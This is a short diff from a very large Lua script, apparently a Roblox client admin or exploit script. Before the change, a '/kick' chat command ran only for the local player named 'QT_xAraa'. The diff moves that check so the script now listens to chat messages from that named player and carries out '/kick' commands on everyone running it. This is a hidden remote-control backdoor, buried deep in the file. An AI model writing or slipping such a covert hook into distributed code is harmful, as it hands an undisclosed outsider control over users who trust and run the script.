@@ -15326,22 +15326,19 @@ local function kickPlayer(playerName)
 end
 
 local function onCommand(input)
-    if LocalPlayer.Name == "QT_xAraa" then
-        local command = string.split(input, " ")
-        if command[1] == "/kick" and command[2] then
-            kickPlayer(command[2])
-        end
+    local command = string.split(input, " ")
+    if command[1] == "/kick" and command[2] then
+        kickPlayer(command[2])
     end
 end
 
-game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
-    if not gameProcessed and input.KeyCode == Enum.KeyCode.Return then
-        local chatInput = game:GetService("StarterGui"):GetCore("ChatWindow")
-        local message = chatInput.Text
-        onCommand(message)
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == "QT_xAraa" then
+        player.Chatted:Connect(function(message)
+            onCommand(message)
+        end)
     end
 end)
-
 -----------------------------}
 
 -- NA PC Version script:
